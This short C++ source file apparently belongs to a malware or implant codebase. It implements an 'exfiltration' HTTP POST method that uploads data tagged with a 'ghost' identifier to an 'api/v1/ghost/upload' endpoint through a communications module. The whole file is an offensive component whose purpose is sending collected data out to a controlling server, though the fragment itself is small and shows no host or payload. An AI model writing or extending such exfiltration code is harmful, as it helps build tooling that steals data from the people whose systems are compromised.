#include "modules/exfiltration/HttpPost.hpp"
#include "core/Config.hpp"
#include "network/Comms.hpp"

bool HttpPostMethod::send(const std::string& type, const std::string& data) {
    std::string endpoint = "api/v1/ghost/upload/" + Config::GetGhostId() + "/" + type;
    return Comms::UploadFile(endpoint, type, data);
}
